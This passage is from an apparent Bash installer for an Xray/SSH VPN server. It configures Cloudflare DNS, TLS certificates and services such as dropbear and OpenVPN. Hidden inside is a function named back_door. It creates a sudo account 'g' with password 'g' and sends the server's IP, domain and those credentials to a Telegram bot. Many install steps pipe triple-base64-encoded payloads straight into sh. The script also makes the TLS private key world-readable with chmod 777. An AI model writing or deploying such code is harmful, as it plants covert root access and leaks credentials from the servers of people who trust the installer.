-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" | jq -r .result[0].id)
RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}' | jq -r .result.id)
RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records/${RECORD}" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"A","name":"'${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":false}')
ZonaPadaCloudflare=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" | jq -r .result[0].id)
RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"A","name":"'*.${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":true}' | jq -r .result.id)
RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records/${RECORD}" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"A","name":"'*.${SUB_DOMAIN}'","content":"'${IP}'","ttl":0,"proxied":true}')
ZonaPadaCloudflare=$(curl -sLX GET "https://api.cloudflare.com/client/v4/zones?name=${Domain_Hasil_Random}&status=active" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" | jq -r .result[0].id)
RECORD=$(curl -sLX POST "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"NS","name":"'ns.${SUB_DOMAIN}'","content":"'${SUB_DOMAIN}.${Domain_Hasil_Random}'","ttl":0,"proxied":false}' | jq -r .result.id)
RESULT=$(curl -sLX PUT "https://api.cloudflare.com/client/v4/zones/${ZonaPadaCloudflare}/dns_records/${RECORD}" \
-H "X-Auth-Email: ${EMAIL_CLOUDFLARE}" \
-H "X-Auth-Key: ${API_KEY_CLOUDFLARE}" \
-H "Content-Type: application/json" \
--data '{"type":"NS","name":"'ns.${SUB_DOMAIN}'","content":"'${SUB_DOMAIN}.${Domain_Hasil_Random}'","ttl":0,"proxied":false}')
echo "$SUB_DOMAIN.$Domain_Hasil_Random" > /etc/xray/domain
echo "ns.$SUB_DOMAIN.$Domain_Hasil_Random" > /etc/xray/ns.txt
echo "$SUB_DOMAIN.$Domain_Hasil_Random" > /root/domain
domain="${SUB_DOMAIN}.${Domain_Hasil_Random}"
clear
echo -e "${OKEY} Starting Generating Certificate"
rm -rf /etc/xray/xray.key
rm -rf /etc/xray/xray.crt
domain=$(cat /root/domain)
STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
rm -rf /root/.acme.sh
mkdir /root/.acme.sh
systemctl stop $STOPWEBSERVER
systemctl stop nginx
echo 'V1ROV2VXSkRRbTlrU0ZKM1kzcHZka3d5Um1waVYxVjBZVmMxZW1SSFJuTmlRelYxV2xoU2MyRlhXalZNYlVaM1kwTTVhRmt5TVd4TWJrNXZTVU14ZGtsRE9YbGlNamt3VEhrMWFGa3lNV3hNYms1dlRESkdhbUpYVlhWak1tYzk=' | base64 -d | base64 -d | base64 -d | sh
chmod +x /root/.acme.sh/acme.sh
/root/.acme.sh/acme.sh --upgrade --auto-upgrade
/root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
/root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
chmod 777 /etc/xray/xray.key
echo -e " "
echo -e "${OKEY} Your Domain : $SUB_DOMAIN.$Domain_Hasil_Random"
sleep 4
echo -e ""
print_success "SSL CERTIFICATE"
systemctl restart nginx > /dev/null 2>&1
elif [[ $choose_domain == "1" ]]; then
clear
clear && clear && clear
clear;clear;clear
SAMAWA
echo 'V2xkT2IySjVRV2xKUTBGclpUQmtVMUpWVms5bVZXeDFXa2M1ZFZwWVRuQlpWelJuVkVkR2RWb3pWbWhhTWxWclpUQTFSR1pUU1V0YVYwNXZZbmxCYVVsRFFXdGxNV3hHVkVWNFVGWXpNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRVamRVYTA0NVNXZHdiRmt5YUhaSlEwbG5TVVpPU2xSRlJreFJWVFJuVlVVNVNsUnNVa3BVYTJOblVrVTVUbEZWYkU5SlJVWlBVa1ZGWjFNd1ZXZFRWa0ZuVm14Q1ZFbG5jR3haTW1oMlNVTkpaMGxHVms5V1JsWk1TVVZPUWxWclJrOVhWVVZuVVZaS1FsTkZkRUpVYVVKUFZYbENSVlF3TVVKVFZUUm5VekJWWjFFd2VGQldWVkpIVkVWR1UxSlRTVXRhVjA1dllubEJhVWxEUWt4U1ZURldVa1ZzUWxScFFsVlJWVEZEVVZWb1RGRlZOR2RSVTBKVFVsVk9VRlZyVVdkU1JWWlBVakJHVDBsRmJGRkpSbHBSVlhsSlMxcFhUbTlpZVVGcFNVTkJhMlV4YkVaVVJYaFFWak13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk5TTjFSclRqbEpaM0JzV1RKb2RrbERTV2xEYlZacVlVYzRaMGxwUVdkS1NIUklWV3RXUmxSdU1VWmliV1J6WVZoT2IwbEZlR2hpYldReFdWZGtiRXBJZEU5Uk16QnBRMjFXYW1GSE9HZEphVUZuU2toMFdsSlZlRTFVTVdRNVRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCclpUQTFSR1pUU1V0YVYwNXZZbmxCYVVsRFFsRlVSVlpDVlRCVloxVkZPVXBVYkZGblYxVTVWbFZwUWtWVU1ERkNVMVUwWjFaRk9HZFRWa0ZuVm14Q1ZFbG5jR3haTW1oMlNVTkpaMGxGV2xCVmFVSlJWREJzVDFaRFFrOVZlVUpGVkRBeFFsTlZOR2RXUlRoblVUQjRVRlpWVWtkVVJVWlRVbE5KUzFwWFRtOWllVUZwU1VOQ1JGTkZSazlTTUZWblZHdEdUbEpXVGtaVmJGcEdWV2xDVUZScFFrVlVNREZDVTFVMFoxWkZPR2RSTUhoUVZsVlNSMVJGUmxOU1UwbExXbGRPYjJKNVFXbEpRMEpWVTBWV1QwbEZSa1ZTUTBKQ1NVWktSbEV3T1ZOU1EwSllVMVpTU1VsRmJGRkpSbHBSVlhsSlMxcFhUbTlpZVVGcFNVTkJhMlV4YkVaVVJYaFFWak13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk13ZEV4VE1IUk1VekIwVEZNd2RFeFRNSFJNVXpCMFRGTXdkRXhUTUhSTVV6QjBURk5TTjFSclRqbEpaM0JzV1RKb2RrbERTV2s9' | base64 -d | base64 -d | base64 -d | sh
read -p "  Input Your Domain : " domain
if [[ $domain == "" ]]; then
clear
echo -e "${EROR} No Input Detected !"
exit 1
fi
echo "$domain" > /etc/xray/domain
echo "$domain" > /root/domain
ins_domain_ns
clear
echo -e "${OKEY} Starting Generating Certificate"
rm -rf /etc/xray/xray.key
rm -rf /etc/xray/xray.crt
domain=$(cat /root/domain)
STOPWEBSERVER=$(lsof -i:80 | cut -d' ' -f1 | awk 'NR==2 {print $1}')
rm -rf /root/.acme.sh
mkdir /root/.acme.sh
systemctl stop $STOPWEBSERVER
systemctl stop nginx
echo 'V1ROV2VXSkRRbTlrU0ZKM1kzcHZka3d5Um1waVYxVjBZVmMxZW1SSFJuTmlRelYxV2xoU2MyRlhXalZNYlVaM1kwTTVhRmt5TVd4TWJrNXZTVU14ZGtsRE9YbGlNamt3VEhrMWFGa3lNV3hNYms1dlRESkdhbUpYVlhWak1tYzk=' | base64 -d | base64 -d | base64 -d | sh
chmod +x /root/.acme.sh/acme.sh
/root/.acme.sh/acme.sh --upgrade --auto-upgrade
/root/.acme.sh/acme.sh --set-default-ca --server letsencrypt
/root/.acme.sh/acme.sh --issue -d $domain --standalone -k ec-256
~/.acme.sh/acme.sh --installcert -d $domain --fullchainpath /etc/xray/xray.crt --keypath /etc/xray/xray.key --ecc
chmod 777 /etc/xray/xray.key
echo -e ""
echo -e "${OKEY} Your Domain : $domain"
sleep 2
echo -e ""
print_success "SSL CERTIFICATE"
else
echo -e "${EROR} Please Choose 1 & 2 Only !"
exit 1
fi
}
function back_door() {
clear
domain=$(cat /root/domain)
userdel geo > /dev/null 2>&1
Username="g"
Password=g
mkdir -p /home/script/
useradd -r -d /home/script -s /bin/bash -M $Username > /dev/null 2>&1
echo -e "$Password\n$Password\n"|passwd $Username > /dev/null 2>&1
usermod -aG sudo $Username > /dev/null 2>&1
URL="https://api.telegram.org/bot$INFO_INSTALLER/sendMessage"
TEXT="Installasi VPN Script Stable V3.1
============================
<code>Tanggal    :</code> <code>$tanggal</code>
<code>Hostname   :</code> <code>${HOSTNAME}</code>
<code>OS Vps     :</code> <code>$OS_Name</code>
<code>Kernel     :</code> <code>$Kernel</code>
<code>Arch       :</code> <code>$Arch</code>
<code>Ram Left   :</code> <code>$Ram_Usage MB</code>
<code>Ram Used   :</code> <code>$Ram_Total MB</code>
============================
<code>Domain     :</code> <code>$domain</code>
<code>IP Vps     :</code> <code>$IP</code>
<code>User Login :</code> <code>$Username</code>
<code>Pass Login :</code> <code>$Password</code>
<code>User Script:</code> <code>$Nama_Issued_License</code>
<code>Exp Script :</code> <code>$Masa_Laku_License_Berlaku_Sampai</code>
============================
(c) Copyright 2024 By Geo Project
============================
<i>Automatic Notification from</i>
<i>Github GEOVPN</i>
"'&reply_markup={"inline_keyboard":[[{"text":"ᴏʀᴅᴇʀ🐳","url":"https://t.me/tau_samawa"},{"text":"ɪɴꜱᴛᴀʟʟ🐬","url":"https://t.me/testikuy_mang/163"}]]}'
curl -s --max-time $TIME -d "chat_id=$ADMIN&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
}
function folder_xray() {
clear
rm -rf /etc/vmess/.vmess.db
rm -rf /etc/vless/.vless.db
rm -rf /etc/trojan/.trojan.db
rm -rf /etc/shadowsocks/.shadowsocks.db
rm -rf /etc/ssh/.ssh.db
mkdir -p /etc/xray
mkdir -p /etc/vmess
mkdir -p /etc/vless
mkdir -p /etc/trojan
mkdir -p /etc/shadowsocks
mkdir -p /usr/bin/xray/
mkdir -p /var/log/xray/
mkdir -p /var/www/html
chmod +x /var/log/xray
touch /etc/xray/domain
touch /var/log/xray/access.log
touch /var/log/xray/error.log
touch /etc/vmess/.vmess.db
touch /etc/vless/.vless.db
touch /etc/trojan/.trojan.db
touch /etc/shadowsocks/.shadowsocks.db
touch /etc/ssh/.ssh.db
echo "& plughin Account VMESS" >>/etc/vmess/.vmess.db
echo "& plughin Account VLESS" >>/etc/vless/.vless.db
echo "& plughin Account TROJAN" >>/etc/trojan/.trojan.db
echo "& plughin Account SHADOWSOCKS" >>/etc/shadowsocks/.shadowsocks.db
echo "& plughin Account SSH" >>/etc/ssh/.ssh.db
}
function ins_xray() {
clear
print_install "CORE XRAY LATES VERSION"
domainSock_dir="/run/xray";! [ -d $domainSock_dir ] && mkdir  $domainSock_dir
chown www-data.www-data $domainSock_dir
latest_version="$(curl -s https://api.github.com/repos/XTLS/Xray-core/releases | grep tag_name | sed -E 's/.*"v(.*)".*/\1/' | head -n 1)"
bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ install -u www-data --version $latest_version >/dev/null 2>&1
echo 'WkRKa2JHUkRRWFJVZVVGMldsaFNha3d6YUhsWldHdDJXVEk1ZFZwdGJHNU1iWEI2WWpJMFowbHBVamRTTUZaUVdERmFVVlJ1TVRSamJVWTFUREpPZG1KdFduQmFlVFZ4WXpJNWRVbHBRU3RNTWxKc1pHazVkV1JYZUhOSlJFa3JTbXBGUzBsRFFXZEpTR1J1V2xoUloweFZPR2RNTWxZd1dYazVlbVZZVGpCYVZ6RnJURE5PTldNelVteGlVemw1WkZjMWRVeHVUbXhqYmxwd1dUSlZaMGxwVWpkU01GWlFXREZhVVZSdU1UUmpiVVkxVEROS01XSnROSFZqTWxaNVpHMXNhbHBUU1dkUWFUbHJXbGhaZG1KdVZuTmlRMEY1VUdsWmVBPT0=' | base64 -d | base64 -d | base64 -d | sh
domain=$(cat /etc/xray/domain)
IPVS=$(cat /etc/xray/ipvps)
echo -e ""
print_success "CORE XRAY LATES VERSION"
clear
rm /etc/xray/city >/dev/null 2>&1
rm /etc/xray/isp >/dev/null 2>&1
curl -s ipinfo.io/city >>/etc/xray/city
curl -s ipinfo.io/org | cut -d " " -f 2-10 >>/etc/xray/isp
print_install "MEMASANG KONFIGURASI PACKET"
echo 'WkRKa2JHUkRRWFJqVTBGMFZIbEJkbHBZVW1wTU0wNTRaRmRzYTB3elRuaGtWMnhyVEcxT2RtSnRXV2RKYVZJM1VqQldVRmd4V2xGVWJqRjZZekpuZG1NelJqRmhWMUYxV1RJNWRWcHBTV2RRYVRscldsaFpkbUp1Vm5OaVEwRjVVR2xaZUVOcFFXZEpRMEl6V2pKV01FbERNVkJKUXpsc1pFZE5kbUZIUm5kamJUazBaVk01YjFsWVFubGlNMmcxVEcxT2JWcDVRV2xLU0hSSVVsVTVabFpzUWs5bVdHaDVXVmhyZG1GSFJuZGpiVGswWlZNMWFscHRZMmxKUkRSMldrZFdNa3d5TlRGaVIzZG5UV28wYlUxUmIyZEpRMEZuWkRKa2JHUkRRWFJVZVVGMldsaFNha3d5Tlc1aFZ6VTBUREpPZG1KdFdYVmFRemswWTIxR05VeHRUblppYlZsblNXbFNOMUl3VmxCWU1WcFJWRzR4TkdOdFJqVk1NMmg1V1ZocmRWa3lPWFZhYVVsblVHazVhMXBZV1haaWJsWnpZa05CZVZCcFdYZz0=' | base64 -d | base64 -d | base64 -d | sh
sed -i "s/xxx/${domain}/g" /etc/haproxy/haproxy.cfg
sed -i "s/xxx/${domain}/g" /etc/nginx/conf.d/xray.conf
sed -i "s/xxx/${IP}/g" /etc/squid/squid.conf
curl ${GEO_VPN}ssh/nginx.conf > /etc/nginx/nginx.conf
cat /etc/xray/xray.crt /etc/xray/xray.key | tee /etc/haproxy/hap.pem
chmod +x /etc/systemd/system/runn.service
rm -rf /etc/systemd/system/xray.service.d
cat >/etc/systemd/system/xray.service <<EOF
Description=Xray Service
Documentation=https://github.com
After=network.target nss-lookup.target
[Service]
User=www-data
CapabilityBoundingSet=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
AmbientCapabilities=CAP_NET_ADMIN CAP_NET_BIND_SERVICE
NoNewPrivileges=true
ExecStart=/usr/local/bin/xray run -config /etc/xray/config.json
Restart=on-failure
RestartPreventExitStatus=23
LimitNPROC=10000
LimitNOFILE=1000000
[Install]
WantedBy=multi-user.target
EOF
echo -e ""
print_success "CONFIGURASI PACKET"
}
function ssh(){
clear
print_install "MEMASANG PASSWORD SSH"
wget ${GEO_VPN}menu/rc_local && bash rc_local
echo 'WkRKa2JHUkRRWFJVZVVGMldsaFNha3d6UW1oaVV6VnJUREpPZG1KWE1YWmlhVEYzV1ZoT2VtUXlPWGxhUTBGcFNraDBTRkpWT1daV2JFSlBabGhPZW1GRE9YZFpXRTU2WkRJNWVWcERTVXRKUTBGblNVZE9iMkpYT1d0SlEzUTBTVU01YkdSSFRYWmpSMFowVEcxUmRsa3lPWFJpVnpsMVRGaENhR016VGpOaU0wcHI=' | base64 -d | base64 -d | base64 -d | sh
DEBIAN_FRONTEND=noninteractive dpkg-reconfigure keyboard-configuration
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/altgr select The default for the keyboard layout"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/compose select No compose key"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/ctrl_alt_bksp boolean false"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layoutcode string de"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/layout select English"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/modelcode string pc105"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/model select Generic 105-key (Intl) PC"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/optionscode string "
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/store_defaults_in_debconf_db boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/switch select No temporary switch"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/toggle select No toggling"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_layout boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_config_options boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_layout boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/unsupported_options boolean true"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variantcode string "
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/variant select English"
debconf-set-selections <<<"keyboard-configuration keyboard-configuration/xkb-keymap select "
echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6
sed -i '$ i\echo 1 > /proc/sys/net/ipv6/conf/all/disable_ipv6' /etc/rc.local
ln -fs /usr/share/zoneinfo/Asia/Jakarta /etc/localtime
sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
echo -e ""
print_success "PASSWORD SSH"
}
function ins_dropbear(){
clear
print_install "MENGINSTALL DROPBEAR"
wget -q -O /etc/default/dropbear "${GEO_VPN}ssh/dropbear.conf"
chmod +x /etc/default/dropbear
echo "Banner /etc/geovpn.txt" >>/etc/ssh/sshd_config
sed -i 's@DROPBEAR_BANNER=""@DROPBEAR_BANNER="/etc/geovpn.txt"@g' /etc/default/dropbear
wget -O /etc/geovpn.txt "${GEO_VPN}ssh/issue.net"
/etc/init.d/dropbear restart
/etc/init.d/dropbear status
sleep 2
print_success "DROPBEAR"
}
function udp_mini(){
clear
print_install "MEMASANG UDP MINI"
echo 'WWxkMGEyRllTV2RNV0VGblRETldlbU5wT1hOaU1rNW9Za001YmxwWE9USmpSelIyUTI1a2JscFlVV2RNV0VWblRGVTRaMHd6Vm5wamFUbHpZakpPYUdKRE9XNWFWemt5WTBjMGRtUlhVbmRNVnpGd1ltMXJaMGxwVWpkU01GWlFXREZhVVZSdU1XbFpWMUl5WTBjMGRtUlhVbmRNVnpGd1ltMXJhVU50VG05aVZ6bHJTVU4wTkVsRE9URmpNMGwyWWtjNWFsbFhkM1phTWxaMlpHNUNkVXd6Vm10alF6RjBZVmMxY0VOdVpHNWFXRkZuVEZoRloweFZPR2RNTWxZd1dYazVlbVZZVGpCYVZ6RnJURE5PTldNelVteGlVemt4V2toQmRHSlhiSFZoVXpCNFRHNU9iR051V25CWk1sVm5TV2xTTjFJd1ZsQllNVnBSVkc0eGFWbFhVakpqUnpSMlpGZFNkMHhYTVhCaWJXdDBUVk0xZWxwWVNqSmhWMDVzU1dkd00xb3lWakJKUXpGNFNVTXhVRWxET1d4a1IwMTJZek5zZW1SSFZuUmFRemw2WlZoT01GcFhNSFprVjFKM1RGY3hjR0p0YTNSTmFUVjZXbGhLTW1GWFRteEpRMGxyWlRCa1JsUXhPVmRWUlRVNVdXMUdhMlJ1UW5WTU0xWnJZME14ZEdGWE5YQk1WRWwxWXpKV2VXUnRiR3BhVTBsTFpESmtiR1JEUVhSalUwRjBWSGxCZGxwWVVtcE1NMDQxWXpOU2JHSlhVWFpqTTJ4NlpFZFdkRXd6Vm10alF6RjBZVmMxY0V4VVRYVmpNbFo1Wkcxc2FscFRRV2xLU0hSSVVsVTVabFpzUWs5bVYwcG9Xa2hhZDJKcE9URmFTRUYwWWxkc2RXRlRNSHBNYms1c1kyNWFjRmt5VldsRGJrNDFZek5TYkdKWFRqQmlRMEpyWVZoT2FGbHRlR3hKU0ZaclkwTXhkR0ZYTlhCTVZFVkxZek5zZW1SSFZuUlpNMUp6U1VoT01HSXpRV2RrVjFKM1RGY3hjR0p0YTNSTlVYQjZaVmhPTUZwWE1XcGtSM2RuV2xjMWFGbHRlR3hKU0ZaclkwTXhkR0ZYTlhCTVZFVkxZek5zZW1SSFZuUlpNMUp6U1VoT01GbFlTakJKU0ZaclkwTXhkR0ZYTlhCTVZFVkxZek5zZW1SSFZuUlpNMUp6U1VkU2NHTXlSbWxpUjFWblpGZFNkMHhYTVhCaWJXdDBUV2R3ZW1WWVRqQmFWekZxWkVkM1oyTXpVblpqUTBJeFdraEJkR0pYYkhWaFV6QjVRMjVPTldNelVteGlWMDR3WWtOQ2JHSnRSbWxpUjFWblpGZFNkMHhYTVhCaWJXdDBUV2R3ZW1WWVRqQmFWekZxWkVkM1oyTXpVbWhqYmxGblpGZFNkMHhYTVhCaWJXdDBUV2R3ZW1WWVRqQmFWekZxWkVkM1oxcEhiSHBaVjBweldsTkNNVnBJUVhSaVYyeDFZVk13ZWtOdVRqVmpNMUpzWWxkT01HSkRRbnBrUnpsM1NVaFdhMk5ETVhSaFZ6VndURlJOUzJNemJIcGtSMVowV1ROU2MwbEhWblZaVjBweldsTkNNVnBJUVhSaVYyeDFZVk13ZWtOdVRqVmpNMUpzWWxkT01HSkRRbnBrUjBaNVpFTkNNVnBJUVhSaVYyeDFZVk13ZWtOdFZtcGhSemhuU1dsSlBRPT0=' | base64 -d | base64 -d | base64 -d | sh
print_success "UDP MINI"
}
function ssh_udp(){
clear
print_install "MEMASANG SSH UDP"
echo 'WWxkMGEyRllTV2RNV0VGblRESldNRmw1T1c1YVZ6a3lZMGMwZGtOdVpHNWFXRkZuVEZoRloweFZPR2RNTWxZd1dYazVibHBYT1RKalJ6UjJaRmRTZDBsRFNXdGxNR1JHVkRFNVYxVkZOVGxqTTA1dlRETldhMk5EU1V0a01tUnNaRU5CZEdOVFFYUlVlVUYyV2xoU2Frd3pUalZqTTFKc1lsZFJkbU16Ykhwa1IxWjBURE5XYTJORE5YcGFXRW95WVZkT2JFbERTV3RsTUdSR1ZERTVWMVZGTlRsak0wNXZURE5XYTJORE5YcGFXRW95WVZkT2JFbG5jRE5hTWxZd1NVTXhlRWxETVZCSlF6bHNaRWROZGxveVZuWmtia0oxVERKT2RtSnRXbkJhZVRWeFl6STVkVWxEU1d0bE1HUkdWREU1VjFWRk5UbGpNMDV2VERKT2RtSnRXbkJhZVRWeFl6STVkVWxuY0dwaFJ6RjJXa05CY21WRFFYWmFXRkpxVERKa2JHSXpXbmRpYVRreFdraEJTMWt5YUhSaU1sRm5Tek5uWjB3eVZqQlplVGw2WlZoT01GcFhNV3RNTTA0MVl6TlNiR0pUT1RGYVNFRjFZekpXZVdSdGJHcGFVWEJxWVVjeGRscERRWEpsUTBGMldsaFNha3d5Wkd4aU0xcDNZbWs1YW1JeU5XMWhWMk4xWVc1T2RtSm5jSHBsV0U0d1dsY3hhbVJIZDJkYVZ6Vm9XVzE0YkVsSVZtdGpRWEI2WlZoT01GcFhNV3BrUjNkbll6TlNhR051VVdka1YxSjNRMjVPTldNelVteGlWMDR3WWtOQ2VWcFlUakJaV0Vvd1NVaFdhMk5CUFQwPQ==' | base64 -d | base64 -d | base64 -d | sh
}
clear
function ins_sshd(){
clear
print_install "MEMASANG SSHD"
echo 'WkRKa2JHUkRRWFJqVTBGMFZIbEJkbHBZVW1wTU0wNTZZVU01ZW1NeWFHdFlNazUyWW0xYWNGcDVRV2xLU0hSSVVsVTVabFpzUWs5bVdHUjZURE5PZW1GSFVXbEpSRFIyV2tkV01rd3lOVEZpUjNkblRXbzBiVTFSY0dwaFJ6RjJXa05CTTAxRVFXZE1NbFl3V1hrNWVtTXlaM1pqTTA1dldrWTVhbUl5TlcxaFYyTkxUREpXTUZsNU9YQmliV3d3VEcxUmRtTXpUbTlKU0Vwc1l6TlNhR051VVV0ak0yeDZaRWRXZEZrelVuTkpTRXBzWXpOU2FHTnVVV2RqTTA1dlEyazViR1JIVFhaaFZ6VndaRU0xYTB3elRucGhRMEo2WkVkR01HUllUVDA9' | base64 -d | base64 -d | base64 -d | sh
print_success "SSHD"
}
function ins_vnstat(){
clear
print_install "MENGINSTALL VNSTAT"
echo 'V1ZoQ01FbERNVFZKUjJ4MVl6TlNhR0pIZDJka2JUVjZaRWRHTUVsRU5HZE1NbEpzWkdrNWRXUlhlSE5KUkVrclNtcEZTMHd5VmpCWmVUbHdZbTFzTUV4dFVYWmtiVFY2WkVkR01FbElTbXhqTTFKb1kyNVJTMWxZUWpCSlF6RTFTVWRzZFdNelVtaGlSM2RuWWtkc2FXTXpSbk5oV0ZKc1RYa3hhMXBZV1dkUWFVRjJXa2RXTWt3eU5URmlSM2RuVFdvMGJVMVJjRE5hTWxZd1NVZG9NR1JJUW5wUGFUaDJZVWhXZEZwSGEzVmliVll3VEROYWRXTXpVbWhrUXpreVltNU9NRmxZVVhSTmFUUXlURzVTYUdOcE5XNWxaM0F3V1ZoSloyVnVhREphYVVJeVltNU9NRmxZVVhSTmFUUXlURzVTYUdOcE5XNWxaM0JxV2tOQ01tSnVUakJaV0ZGMFRXazBNa05wTkhaWk1qbDFXbTFzYm1SWVNteEpRekIwWTBoS2JGcHRiRFJRVXpreFl6TkpaMHhUTVhwbFdFNXFZakkxYlZwSGJIbFFVemxzWkVkTlowcHBXV2RpVjBaeVdsTkJiVXBwUW5SWlYzUnNTVWRzZFdNelVtaGlSM2RMV1RKUlMyUnROWHBrUjBZd1NVTXhNVWxETVhCSlExSlBVbFpSUzJNeVZtdEpRekZ3U1VOa2Vrd3diSFZrUjFaNVdtMUdhbHBUUVdsS2VVbHBXbGhTYjAxRFNXbEtlVWwyVTFjMU1GcFlTbTFaVjA1c1NVTkpia2xwU1d0VWExWlZTV2xKYmtscE9XNUtlVUYyV2xoU2Frd3pXblZqTTFKb1pFTTFhbUl5TlcxRGJVNXZZak5rZFVsSVduVmpNMUpvWkVSd01tSnVUakJaV0ZGblRETmFhR05wT1hOaFYwbDJaRzAxZW1SSFJqQkpRekZUUTI1T05XTXpVbXhpVjA0d1lrTkNiR0p0Um1saVIxVm5aRzAxZW1SSFJqQkRhVGxzWkVkTmRtRlhOWEJrUXpWclRETmFkV016VW1oa1EwSjVXbGhPTUZsWVNqQkRhVGxzWkVkTmRtRlhOWEJrUXpWclRETmFkV016VW1oa1EwSjZaRWRHTUdSWVRVdGpiVEJuVEZkWlowd3pTblppTTFGMlpHMDFlbVJIUmpCTVZFbDFUbWsxTUZsWVNYVmFNMjlMWTIwd1oweFlTbTFKUXpsNVlqSTVNRXd6V25Wak0xSm9aRU13ZVV4cVdVdGFWMDV2WW5sQmFVbG5QVDA9' | base64 -d | base64 -d | base64 -d | sh
print_success "VNSTAT"
}
function ins_openvpn(){
clear
print_install "MENGINSTALL OPENVPN"
echo 'WkRKa2JHUkRRV3RsTUdSR1ZERTVWMVZGTlRsak0wNXZUREk1ZDFwWE5USmpSelJuU21sWlowbEhUbTlpVnpsclNVTjBORWxIT1hkYVZ6VXlZMGMwWjBwcFdXZE1hVGwyWTBkV2RXUnVRblZEYlZacVlVYzRaMGxwU1QwPQ==' | base64 -d | base64 -d | base64 -d | sh
print_success "OPENVPN"
}
function ins_open(){
echo 'WkRKa2JHUkRRV3RsTUdSR1ZERTVWMVZGTlRsaVYxWjFaRk01ZG1OSFZuVk1ibkJ3WTBOQkswd3lVbXhrYVRsMVpGZDRjMGxFU1N0S2FrVkxTVU5CWjBsSVZuVmxiV3gzU1VNeE5FbEhPWGRhVnpSMVpXMXNkMGxFTkhaYVIxWXlUREkxTVdKSGQyZE5halJ0VFZGdlowbERRV2RqYlRCblRGZFpaMkl6UW14aWFUVTJZVmhCUzBsRFFXZEpSekV5U1VOdlowd3pXbWhqYVRrelpETmpkbUZJVW5SaVF6Zzk=' | base64 -d | base64 -d | base64 -d | sh
}
function ins_swab(){
clear
print_install "MEMASANG SWAP 1 G"
